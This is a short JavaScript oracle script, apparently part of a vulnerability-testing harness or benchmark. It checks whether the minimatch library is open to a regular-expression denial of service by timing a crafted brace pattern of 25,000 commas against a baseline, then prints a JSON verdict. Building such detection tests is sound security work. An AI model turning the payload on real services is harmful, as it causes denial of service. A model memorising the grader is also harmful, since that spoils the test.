let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function out() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign checks first: verify ordinary API behavior works.
  const ok1 = minimatch('alpha.js', '*.js') === true;
  const ok2 = minimatch('alpha.txt', '*.js') === false;
  if (!ok1 || !ok2) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed';
    out();
  } else {
    operation_completed = true;

    // Crafted ReDoS-ish payload from known minimatch issue shape.
    // Keep bounded and compare against baseline call time in the same process.
    const commas = 25000;
    const maliciousPattern = '{' + ','.repeat(commas) + '}';
    const target = 'x';

    function timedCall(pat) {
      const t0 = process.hrtime.bigint();
      let threw = false;
      let res;
      try {
        res = minimatch(target, pat);
      } catch (e) {
        threw = true;
        res = e;
      }
      const ms = Number(process.hrtime.bigint() - t0) / 1e6;
      return { threw, res, ms };
    }

    // Baseline with similar API path but simple pattern.
    const baseline = timedCall('*');
    if (baseline.threw) {
      operation_completed = false;
      exploit_succeeded = false;
      evidence = 'baseline_call_threw';
      out();
    } else {
      const mal = timedCall(maliciousPattern);

      if (mal.threw) {
        exploit_succeeded = false;
        evidence = 'malicious_call_threw;commas=' + commas + ';baseline_ms=' + baseline.ms.toFixed(3) + ';malicious_ms=' + mal.ms.toFixed(3);
      } else {
        // Robust, bounded timing heuristic:
        // vulnerable should be dramatically slower than baseline; fixed should not.
        const ratio = mal.ms / Math.max(baseline.ms, 0.05);
        const absoluteSlow = mal.ms > 250;
        const relativeSlow = ratio > 25;
        exploit_succeeded = absoluteSlow && relativeSlow;
        evidence = 'commas=' + commas + ';baseline_ms=' + baseline.ms.toFixed(3) + ';malicious_ms=' + mal.ms.toFixed(3) + ';ratio=' + ratio.toFixed(2) + ';malicious_result=' + String(mal.res);
      }

      out();
    }
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  out();
}
